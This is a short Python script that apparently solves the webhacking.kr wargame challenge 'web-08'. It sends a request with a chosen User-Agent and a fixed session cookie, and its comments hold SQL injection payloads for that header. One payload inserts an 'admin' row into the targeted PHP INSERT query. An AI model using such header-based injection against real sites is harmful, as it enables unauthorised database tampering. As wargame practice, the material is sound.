import requests
from fake_useragent import UserAgent

ua = UserAgent()
url = 'http://webhacking.kr/challenge/web/web-08/'
headers = {}
cookies = {}

headers['User-Agent'] = 'r4k4'
#'r4k4\', \'$ip\', \'admin\'), (\'$agent'
# $q=@mysql_query("insert into lv0(agent,ip,id) values('$agent','$ip','guest')") or die("query error");
#'\' or not id=\'guest'
#'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36'
cookies['PHPSESSID'] = '89b016e075a3033a3e4356f2e1c27d59'

print(headers['User-Agent'])
res = requests.get(url, headers=headers, cookies=cookies)

print(res.text)